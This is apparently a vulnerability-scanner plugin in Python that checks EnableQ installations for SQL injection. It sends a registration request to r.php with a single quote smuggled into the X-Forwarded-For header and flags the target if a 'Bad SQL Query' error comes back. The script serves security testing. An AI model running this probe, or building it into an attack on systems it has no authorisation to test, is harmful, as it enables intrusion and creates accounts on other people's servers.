#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref:http://www.wooyun.org/bugs/wooyun-2014-082118
import base64
import urllib
import random
def assign(service, arg):
    if service == "enableq":
        return True, arg

def audit(arg):
    url = arg + "./r.php?qlang=cn&qid=&step=1"
    mail = "testvul" + str(random.randint(1000, 9999)) + "@testvul.net"
    header = "X-Forwarded-For: 1.1.1.1'\r\n"
    data = 'administrators_Name='+mail+'&nickName=testvul&passWord=123456&passWord2=123456&hintPass=3&answerPass=testvul&Action=MemberAddSubmit&submit=%D7%A2%B2%E1&qid='
    code, head, res, errcode,finalurl =  curl.curl(url + ' -H "' +header +'"' + " -d " + data)

    if res.find("Bad SQL Query") != -1 and res.find("administratorsName") != -1:
            security_hole('find sql injection: ' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('enableq', 'http://127.0.0.1/EnableQ_php52/')[1])